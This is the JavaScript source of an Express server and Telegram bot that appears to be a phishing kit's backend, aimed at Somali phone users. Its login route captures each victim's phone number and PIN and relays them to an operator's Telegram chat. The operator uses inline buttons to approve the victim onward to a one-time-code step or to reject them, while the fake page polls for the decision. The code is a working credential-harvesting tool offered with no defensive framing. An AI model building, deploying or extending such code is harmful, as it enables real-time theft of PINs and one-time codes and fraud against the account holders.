const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Dynamic pages (page2, page3 etc.)
app.get('/:page', (req, res) => {
    if (req.params.page.startsWith('api')) {
        return res.status(404).send("Not found");
    }

    const file = req.params.page.endsWith('.html')
        ? req.params.page
        : req.params.page + '.html';

    const filePath = path.join(__dirname, 'public', file);

    res.sendFile(filePath, (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};

    const country = "Somalia";
    const countryCode = "+252";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric',
        day: 'numeric',
        year: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID) {
        return res.status(400).json({ error: "Missing data" });
    }

    statusStore[phone] = "pending";

    const message =
        `📱 <b>CL 2 - LOGIN ATTEMPT</b>\n\n` +
        `🆕 <b>NEW USER</b>\n` +
        `🇸🇴 <b>Country:</b> ${country}\n` +
        `🌍 <b>Country Code:</b> ${countryCode}\n` +
        `📱 <b>Phone Number:</b> ${phone}\n` +
        `🔢 <b>PIN:</b> ${pin}\n` +
        `⏰ <b>Time:</b> ${currentTime}\n\n` +
        `━━━━━━━━━━━━━━━\n\n` +
        `⚠️ <b>User waiting for approval</b>\n` +
        `⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "✅ Allow to Proceed",
                            callback_data: `approve_${phone}_${pin}`
                        }
                    ],
                    [
                        {
                            text: "❌ Invalid Credentials",
                            callback_data: `deny_${phone}_${pin}`
                        }
                    ]
                ]
            }
        });

        res.json({ success: true });

    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BOT ACTIONS --------------------

// APPROVE
bot.action(/approve_(.+)_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];

    statusStore[phone] = "approved";

    const currentTime = new Date().toLocaleTimeString('en-US', {
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
    });

    const approvedMsg =
        `✅ <b>LOGIN APPROVED</b>\n\n` +
        `🆕 <b>NEW USER</b>\n` +
        `🇸🇴 <b>Somalia</b>\n` +
        `📱 <b>${phone}</b>\n` +
        `🔐 <b>${pin}</b>\n\n` +
        `━━━━━━━━━━━━━━━\n\n` +
        `✅ <b>Status: Approved</b>\n` +
        `➡️ <b>Next: First OTP (1/2)</b>\n` +
        `⏱️ <b>${currentTime}</b>`;

    try {
        await ctx.replyWithHTML(approvedMsg);
        await ctx.answerCbQuery("Allowed");
    } catch (e) {
        console.error(e.message);
    }
});

// DENY
bot.action(/deny_(.+)_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];

    statusStore[phone] = "denied";

    const currentTime = new Date().toLocaleTimeString('en-US', {
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
    });

    const deniedMsg =
        `❌ <b>INVALID CREDENTIALS</b>\n\n` +
        `🇸🇴 <b>Somalia</b>\n` +
        `📱 <b>${phone}</b>\n` +
        `🔐 <b>${pin}</b>\n\n` +
        `━━━━━━━━━━━━━━━\n\n` +
        `❌ <b>Status: Rejected</b>\n` +
        `⏱️ <b>${currentTime}</b>`;

    try {
        await ctx.replyWithHTML(deniedMsg);
        await ctx.answerCbQuery("Rejected");
    } catch (e) {
        console.error(e.message);
    }
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;

    if (!phone) {
        return res.json({ status: "pending" });
    }

    res.json({ status: statusStore[phone] || "pending" });
});

// -------------------- START SERVER --------------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});

// -------------------- START BOT --------------------
const startBot = async () => {
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        await bot.launch();
        console.log("🤖 Bot running");
    } catch (err) {
        console.error(err);
    }
};

startBot();
